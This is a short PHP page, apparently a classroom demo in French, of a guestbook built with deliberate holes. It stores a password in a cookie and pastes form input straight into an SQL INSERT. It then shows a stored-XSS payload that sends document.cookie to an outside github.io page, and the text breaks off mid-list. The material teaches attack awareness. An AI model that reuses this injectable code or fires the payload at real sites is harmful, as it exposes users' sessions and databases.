<?php


setcookie('pwd', 'admin123');

$pdo = new PDO("mysql:host;dbname=test", 'root', '');
if(isset($_POST['ajouterMot'])){
    $mot = $_POST['mot'];
    $pdo->query("INSERT INTO livredor VALUES ('', '$mot')");
}

?>
<h3>livre d'or</h3>

<from method="post" action='#'>
    mon mot : <textarea name="mot"></textarea><br>
    <input type="submit" value="Ajouter mon mot" name="ajouterMot">
</form>
<p>Ce site stocke votre mot de passe dans un cookie</p>

<h3>Exemple d'attaque XSS</h3>
<input style="width:100%" value="<script>document.location=\'https://tvinchent-epsi.github.io/xss.html?cookie=\'+document.cookie</script>">
<p> En ajoutant ce script comme entrée du livre d'or;
    <ul>
        <li>vous créez une redirection vers mon script maveillant</li>
        